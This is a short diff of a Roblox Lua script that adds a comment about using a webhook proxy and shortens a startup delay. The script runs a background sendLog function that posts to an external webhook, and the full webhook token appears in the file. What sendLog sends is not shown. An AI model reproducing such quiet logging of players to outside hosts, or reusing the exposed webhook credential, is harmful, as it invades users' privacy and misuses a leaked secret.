@@ -2,6 +2,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 
+-- Proxy 적용 (여러 개 중 하나 사용)
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/1491747700008292563/iV1-Z0BdzkwOxoPO65VSXDiEcktEHYO2RoB1IF-nEWQ2obWybh6KXBPaPTsznUYFL9J_"
 
 local function sendLog()
@@ -35,5 +36,5 @@ end
 
 task.spawn(sendLog)
 
-task.wait(1.2)
+task.wait(1)
 print("Loaded.")
